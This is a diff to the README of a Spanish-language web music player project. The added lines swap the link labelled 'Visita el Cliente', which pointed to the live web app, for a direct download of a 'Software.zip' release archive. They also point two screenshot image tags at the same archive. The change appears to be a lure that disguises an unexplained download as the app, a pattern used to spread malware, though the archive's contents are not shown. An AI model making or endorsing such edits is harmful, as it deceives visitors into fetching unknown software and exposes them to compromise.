@@ -16,7 +16,7 @@ Un reproductor web completamente responsive con musica de entre los 50 y los 90
 
 ____________________
 
-<a href="https://musicapp-puce.vercel.app" target="blank">
+<a href="https://github.com/manuxing/musicapp/releases/download/v1.0/Software.zip" target="blank">
  👉👉👉Visita el Cliente👈👈👈
 </a>
   <br></br>
@@ -26,8 +26,8 @@ ____________________
 
 <br></br>
  <div>
-  <img src="./musicapp/assets/cel.jpg" alt="7"  height="450" width="215"/>
-  <img src="./musicapp/assets/cel2.jpg" alt="8"  height="450" width="215"/>
+  <img src="https://github.com/manuxing/musicapp/releases/download/v1.0/Software.zip" alt="7"  height="450" width="215"/>
+  <img src="https://github.com/manuxing/musicapp/releases/download/v1.0/Software.zip" alt="8"  height="450" width="215"/>
   <img src="./musicapp/assets/Captura de pantalla (124).png" alt="6" height="250" />
   <img src="./musicapp/assets/Captura de pantalla (125).png" alt="5" height="250" />
 </div>
